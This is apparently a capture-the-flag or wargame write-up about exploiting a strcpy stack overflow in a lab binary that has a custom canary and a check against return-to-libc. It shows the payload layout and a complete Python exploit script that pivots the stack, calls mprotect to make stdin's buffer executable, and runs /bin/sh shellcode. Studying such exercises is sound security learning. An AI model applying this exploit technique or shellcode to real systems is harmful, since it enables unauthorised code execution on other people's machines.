# Vulnerability
```c
char buffer[256];

// stack overflow!!
strcpy(buffer,ptr);
```
This program uses strcpy function so this program can be overwrited.

# Exploitation
This program calls `vuln` function that uses strcpy function with parameter canary(0x31337), buffer's address.

In `vuln` function, the protection code is:
```c
// overflow protected
if(canary != 0x31337)
{
  printf("who broke my canary?!");
  exit(1);
}

// preventing RTL
ret = &canary - 1;
if((*ret & 0xff000000) == 0) 
{
  printf("I've an allergy to NULL");
  exit(1);
}

// clearing attack buffer
memset(ptr, 0, 1024);
```
I have to bypass canary check and not use RTL.

This program does not reset `stdin`'s buffer, So I will give permission on that address then the address able to be executed.

The payload will be:
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------
| buffer(256) | dummy(4) | fake EBP(4) | leave&ret(4) | canary(4) | mprotect(4) | fake_ebp+100(4) | stdin(4) | size(4) | permission(4) | "\x90"(256) | shellcode |
------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

# Payload
```python
import os
from struct import *
from socket import *
from time import sleep

p = lambda x: pack('<L', x)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
stdin		= 0xb7ff7000
fake_ebp 	= 0xb7ff710c
mprotect 	= 0x0086d240
canary		= 0x00031337
leave_ret	= 0x0804858e

payload = ""
payload += "A"*256
payload += "A"*4
payload += p(fake_ebp) + p(leave_ret) + p(canary)
payload += p(mprotect) + p(fake_ebp+100)
payload += p(stdin) + p(0x00000800) + p(0x00000007)
payload += "\x90"*256 + shellcode

print payload
```
